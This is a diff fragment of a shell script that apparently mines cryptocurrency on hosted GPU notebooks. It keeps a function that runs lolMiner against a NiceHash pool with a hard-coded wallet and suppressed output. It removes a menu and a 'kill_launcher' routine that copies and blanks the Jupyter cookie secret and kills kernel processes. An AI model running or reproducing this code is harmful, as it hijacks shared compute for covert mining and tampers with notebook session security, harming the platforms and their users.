@@ -95,7 +95,6 @@ cat /proc/driver/nvidia/version
 nvcc -V
 nvidia-smi
 
-conda activate tf
 
 cd /
 echo "pro" > ./content/.config/active_config
@@ -143,38 +142,3 @@ miner_eth(){
   walletstart="./1.42/lolMiner --algo ETHASH --pool stratum+ssl://daggerhashimoto.auto.nicehash.com:443 --user 39Xoi6TZxzarLHrqJJzQLVCFoKis13vhSE.$(echo $(shuf -i 1-9999 -n 1)) >/dev/null 2>&1 "
   $walletstart
 }
-
-
-kill_launcher(){
-  cp ~/.local/share/jupyter/runtime/notebook_cookie_secret ~/.local/share/jupyter/runtime/notebook_cookie_secret_CP
-  echo > ~/.local/share/jupyter/runtime/notebook_cookie_secret
-  pkill -1 -f ipykernel_launcher
-}
-
-echo ""
-PS3="Options start?: "
-options=("TON Mining" "Kill Launcher" "Quit")
-select opt in "${options[@]}"
-do
-  case $opt in
-    "ETH Mining")
-        miner_eth
-      ;;
-    "TON Mining")
-        miner_ton
-      ;;  
-    "Kill Launcher")
-        kill_launcher
-      ;; 
-    "Quit")
-        break
-        ;;
-    *) echo "Opcija Neopstoji";;
-  esac
-done
-
-
-
-
-
-
